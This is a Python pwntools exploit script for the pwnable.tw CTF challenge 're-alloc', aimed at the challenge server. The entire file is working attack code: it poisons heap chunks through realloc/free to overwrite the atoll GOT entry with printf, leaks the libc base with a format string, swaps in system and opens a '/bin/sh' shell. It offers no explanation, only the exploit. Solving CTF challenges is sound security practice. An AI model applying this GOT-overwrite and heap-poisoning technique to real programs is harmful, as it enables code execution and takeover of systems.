import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='re-alloc'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.29")
pdbg.remote('chall.pwnable.tw',10106)
pdbg.context.log_level='debug'
# pdbg.context.terminal = ["tmux", "splitw", "-h"]
while True :
	# try :
		if len(sys.argv)==1 :
			io=pdbg.run("debug")
			# io=pdbg.run("local")
			libc=pdbg.libc
			#one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			libc=ELF('./libc.so.6')
			# libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			# one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(a,b,c):
			io.sendlineafter('Your choice: ','1')
			io.sendlineafter('Index:',str(a))
			io.sendlineafter('Size:',str(b))
			io.sendafter('Data:',c)

		def delete(a):
			io.sendlineafter('Your choice: ','3')
			io.sendlineafter('Index:',str(a))

		def edit(a,b,c):
			io.sendlineafter('Your choice: ','2')
			io.sendlineafter('Index:',str(a))
			io.sendlineafter('Size:',str(b))
			if b != 0:
				io.sendafter('Data:',c)

		def add_hack(a):
			io.sendlineafter('Your choice: ','1')
			io.sendlineafter('Index:',a)

		add(0,0x68,'aaaaaaa')
		edit(0,0,'')
		edit(0,0x48,p64(elf.got['atoll'])+p64(1))
		add(1,0x68,'aaaaaaa')
		delete(0)
		edit(1,0x28,p64(elf.got['atoll'])+p64(1))
		edit(1,0,'')
		edit(1,0x28,p64(elf.got['atoll'])+p64(1))
		add(0,0x48,p64(elf.got['atoll'])+p64(1))
		delete(0)
		edit(1,0x28,p64(elf.got['atoll'])+p64(1))
		delete(1)
		add(0,0x68,p64(elf.plt['printf']))
		add_hack('%6$p')

		libc_base=int(io.recvline(),16)-libc.sym['_IO_2_1_stdout_']
		libc.address=libc_base
		system_addr=libc.sym['system']
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		io.sendlineafter('Your choice: ','1')
		io.sendafter('Index:','1\x00')
		io.sendafter('Size:','%70c')
		io.sendafter('Data:',p64(system_addr))
		add_hack('/bin/sh\x00')
		
			
	

		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue